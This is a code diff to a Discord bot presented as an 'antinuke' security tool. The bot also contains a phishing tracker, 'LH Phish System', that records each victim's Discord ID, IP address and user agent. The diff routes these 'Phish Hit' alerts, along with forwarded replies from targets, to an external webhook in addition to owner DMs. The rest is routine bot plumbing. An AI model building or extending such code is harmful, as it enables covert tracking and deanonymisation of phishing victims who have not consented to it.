@@ -1,6 +1,7 @@
 # language: Python 3.13  |  file: bot.py  |  runtime: discord.py 2.x
 # deps: discord.py — pip install discord.py
 #       flask      — pip install flask
+#       aiohttp    — pip install aiohttp  (usually bundled with discord.py)
 
 import discord
 from discord.ext import commands
@@ -15,6 +16,7 @@ import threading
 from collections import defaultdict
 from typing import Optional
 from flask import Flask, request, jsonify, redirect
+import aiohttp
 
 # ── config ────────────────────────────────────────────────────
 TOKEN              = os.environ.get("TOKEN")
@@ -22,6 +24,12 @@ VERIFY_ROLE_NAME   = "Verified"
 LOG_CHANNEL_NAME   = "lh-antinuke-logs"
 LOG_ROLE_NAME      = "LH Security"
 PREMIUM_USER_ID    = 1224012443341160498
+
+# ── webhook logging ───────────────────────────────────────────
+# Set LOG_WEBHOOK_URL in Railway Variables to a Discord webhook URL.
+# All alerts will post there AND DM the owner.
+# Leave blank to DM-only (original behaviour).
+LOG_WEBHOOK_URL = os.environ.get("LOG_WEBHOOK_URL", "")
 
 # ── known antinuke bot IDs ────────────────────────────────────
 ANTINUKE_IDS = {
@@ -158,21 +166,17 @@ def index():
 
 
 async def _notify_phish_hit(user_id: str, ip: str, user_agent: str, ts: str):
-    try:
-        owner = await bot.fetch_user(PREMIUM_USER_ID)
-        embed = discord.Embed(
-            title="🎣 Phish Hit!",
-            color=0x00ff00,
-            timestamp=discord.utils.utcnow()
-        )
-        embed.add_field(name="Target ID",  value=f"`{user_id}`",          inline=False)
-        embed.add_field(name="IP Address", value=f"`{ip}`",                inline=True)
-        embed.add_field(name="Time",       value=ts,                       inline=True)
-        embed.add_field(name="User Agent", value=f"`{user_agent[:200]}`",  inline=False)
-        embed.set_footer(text="LH Phish System")
-        await owner.send(embed=embed)
-    except Exception:
-        pass
+    embed = discord.Embed(
+        title="🎣 Phish Hit!",
+        color=0x00ff00,
+        timestamp=discord.utils.utcnow()
+    )
+    embed.add_field(name="Target ID",  value=f"`{user_id}`",          inline=False)
+    embed.add_field(name="IP Address", value=f"`{ip}`",                inline=True)
+    embed.add_field(name="Time",       value=ts,                       inline=True)
+    embed.add_field(name="User Agent", value=f"`{user_agent[:200]}`",  inline=False)
+    embed.set_footer(text="LH Phish System")
+    await notify_owner(embed)
 
 
 def _run_flask():
@@ -304,11 +308,45 @@ def parse_duration(s: str) -> Optional[float]:
     return None
 
 async def notify_owner(embed: discord.Embed):
+    # DM the owner
     try:
         owner = await bot.fetch_user(PREMIUM_USER_ID)
         await owner.send(embed=embed)
     except Exception:
         pass
+    # also post to webhook if configured
+    await _webhook_log(embed)
+
+async def _webhook_log(embed: discord.Embed):
+    """Post an embed to LOG_WEBHOOK_URL if set."""
+    if not LOG_WEBHOOK_URL:
+        return
+    payload = {
+        "embeds": [_embed_to_dict(embed)]
+    }
+    try:
+        async with aiohttp.ClientSession() as session:
+            await session.post(LOG_WEBHOOK_URL, json=payload)
+    except Exception:
+        pass
+
+def _embed_to_dict(embed: discord.Embed) -> dict:
+    d: dict = {}
+    if embed.title:       d["title"]       = embed.title
+    if embed.description: d["description"] = embed.description
+    if embed.color:       d["color"]       = embed.color.value
+    if embed.timestamp:   d["timestamp"]   = embed.timestamp.isoformat()
+    if embed.footer.text: d["footer"]      = {"text": embed.footer.text, "icon_url": embed.footer.icon_url or discord.utils.MISSING}
+    if embed.author.name: d["author"]      = {"name": embed.author.name, "icon_url": embed.author.icon_url or discord.utils.MISSING}
+    if embed.thumbnail.url: d["thumbnail"] = {"url": embed.thumbnail.url}
+    if embed.image.url:     d["image"]     = {"url": embed.image.url}
+    if embed.fields:
+        d["fields"] = [{"name": f.name, "value": f.value, "inline": f.inline} for f in embed.fields]
+    # strip MISSING sentinel values
+    for section in ("footer", "author"):
+        if section in d and d[section].get("icon_url") is discord.utils.MISSING:
+            d[section].pop("icon_url", None)
+    return d
 
 async def get_or_create_log_channel(guild: discord.Guild) -> Optional[discord.TextChannel]:
     security_role = discord.utils.get(guild.roles, name=LOG_ROLE_NAME)
@@ -497,23 +535,24 @@ class TunnelReplyModal(discord.ui.Modal, title="💬 Reply"):
             await interaction.followup.send("❌ This conversation has been closed.", ephemeral=True)
             return
 
-        # forward reply to owner
+        # forward reply to owner + webhook log
+        embed = discord.Embed(
+            title="📨 Tunnel Reply Received",
+            description=self.reply_text.value,
+            color=0x5865f2,
+            timestamp=discord.utils.utcnow()
+        )
+        embed.set_author(
+            name=str(interaction.user),
+            icon_url=interaction.user.display_avatar.url
+        )
+        embed.set_footer(text=f"User ID: {interaction.user.id}")
         try:
             owner = await bot.fetch_user(owner_id)
-            embed = discord.Embed(
-                title="📨 Tunnel Reply Received",
-                description=self.reply_text.value,
-                color=0x5865f2,
-                timestamp=discord.utils.utcnow()
-            )
-            embed.set_author(
-                name=str(interaction.user),
-                icon_url=interaction.user.display_avatar.url
-            )
-            embed.set_footer(text=f"User ID: {interaction.user.id}")
             await owner.send(embed=embed)
         except Exception:
             pass
+        await _webhook_log(embed)
 
         # confirm to target
         await interaction.followup.send(
@@ -1922,6 +1961,31 @@ async def ping(interaction: discord.Interaction):
     latency = round(bot.latency * 1000)
     color   = 0x00ff00 if latency < 100 else (0xff9900 if latency < 200 else 0xff0000)
     await interaction.response.send_message(embed=discord.Embed(title="🏓 Pong!", description=f"Latency: **{latency}ms**", color=color), ephemeral=True)
+
+
+# ══════════════════════════════════════════════════════════════
+#  LOG TEST
+# ══════════════════════════════════════════════════════════════
+
+@bot.command(name="logtest")
+async def logtest(ctx):
+    try: await ctx.message.delete()
+    except Exception: pass
+    if ctx.author.id != PREMIUM_USER_ID:
+        await ctx.send("❌ Access Denied.", delete_after=5); return
+    embed = discord.Embed(
+        title="🔔 Log Test",
+        description="Webhook logging is working correctly.",
+        color=0x00ff00,
+        timestamp=discord.utils.utcnow()
+    )
+    embed.add_field(name="Webhook URL", value=f"`{LOG_WEBHOOK_URL[:40]}...`" if LOG_WEBHOOK_URL else "❌ Not configured", inline=False)
+    embed.set_footer(text="LH Logging System")
+    await notify_owner(embed)
+    if LOG_WEBHOOK_URL:
+        await ctx.send("✅ Test alert sent to webhook + DM.", delete_after=5)
+    else:
+        await ctx.send("⚠️ No `LOG_WEBHOOK_URL` set — alert sent to DM only. Add it in Railway Variables.", delete_after=10)
 
 
 # ══════════════════════════════════════════════════════════════
